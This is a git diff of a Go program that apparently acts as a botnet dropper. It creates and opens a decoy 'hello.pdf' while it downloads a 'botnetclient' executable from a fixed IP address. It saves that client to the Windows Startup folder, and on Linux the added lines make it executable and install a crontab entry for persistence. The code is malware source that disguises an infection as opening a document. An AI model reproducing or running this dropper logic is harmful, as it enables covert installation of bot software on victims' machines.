@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"github.com/jung-kurt/gofpdf"
-	//"github.com/robfig/cron/v3"
 	"io"
 	"log"
 	"net/http"
@@ -14,22 +13,15 @@ import (
 	"time"
 )
 
-//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
-//var pdfName = "hello.pdf"
-
-//var clientName = filepath.Join(srcDir, "/files/downloadedclient.exe")
-
 var home, _ = os.UserHomeDir()
 
 var here, _ = os.Getwd()
 
 var opersys = runtime.GOOS
 
-var pdfName = filepath.Join(here, "\\hello.pdf")
+var pdfName = filepath.FromSlash("./hello.pdf")
 
 var clientName string
-
-//var
 
 func createpdf() {
 	//create pdf
@@ -45,10 +37,19 @@ func createpdf() {
 
 func openpdf() {
 	//open pdf
-	cmd1 := exec.Command("cmd.exe", "/C", "start", pdfName)
-	if err := cmd1.Run(); err != nil {
-		log.Println("Error:", err)
+	switch opersys {
+	case "windows":
+		cmd1 := exec.Command("cmd.exe", "/C", "start", pdfName)
+		if err := cmd1.Run(); err != nil {
+			log.Println("Error:", err)
+		}
+	case "linux":
+		fmt.Printf("PDF downloaded to %s\n", pdfName)
+	case "default":
+		fmt.Println("OS unsupported")
+		os.Exit(1)
 	}
+
 }
 
 func getclient() {
@@ -60,13 +61,15 @@ func getclient() {
 	}
 	defer out.Close()
 
+	err = os.Chmod(clientName, 0777)
+
 	// Get the data
 	var resp *http.Response
 	switch opersys {
 	case "windows":
-		resp, err = http.Get("http://localhost:8081/client")
+		resp, err = http.Get("http://192.168.121.128:8081/client-windows.exe")
 	case "linux":
-		resp, err = http.Get("http://127.0.1.1:8081/client")
+		resp, err = http.Get("http://192.168.121.128:8081/client-linux")
 	case "default":
 		fmt.Println("unsupported OS")
 		os.Exit(1)
@@ -93,6 +96,11 @@ func runclient() {
 	if err != nil {
 		log.Fatalf("An Error Occured %v", err)
 	}
+	croncmd := "(crontab -l ; echo \"1 * * * * ./home/$USER/Downloads/botnetclient\") | sort - | uniq - | crontab -"
+	err = exec.Command(croncmd).Run()
+	if err != nil {
+		log.Fatalf("An Error Occured %v", err)
+	}
 }
 
 func main() {
@@ -102,9 +110,7 @@ func main() {
 		clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")
 	case "linux":
 		// cron job probably isn't done here, but where?
-		clientName = filepath.Join(here, "\\botnetclient.exe")
-
-		//cron := cron.New()
+		clientName = filepath.FromSlash("./botnetclient")
 	case "default":
 		fmt.Println("OS will not be supported")
 		os.Exit(1)
